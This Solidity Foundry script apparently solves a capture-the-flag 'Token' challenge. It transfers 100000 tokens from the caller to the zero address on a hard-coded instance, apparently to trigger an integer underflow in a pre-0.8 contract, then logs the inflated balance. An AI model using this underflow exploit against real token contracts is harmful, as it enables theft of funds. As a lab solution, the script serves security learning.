// SPDX-License-Identifier: MIT

pragma solidity 0.6.2;

import {Script, console} from "forge-std/Script.sol";
import "../src/Token.sol";

contract Solve is Script {
    Token public token;
    address instanceAddr = 0x431a69F9Ed812e8D493D5283F6b416dfc5A27b30;
    bool ok;
    function run() external {
        token = Token(instanceAddr);
        vm.startBroadcast();
        ok = token.transfer(address(0), 100000);
        require(ok, "hack failed.");
        vm.stopBroadcast();
        console.log(msg.sender);
        console.log(token.balanceOf(msg.sender));
        
    }
}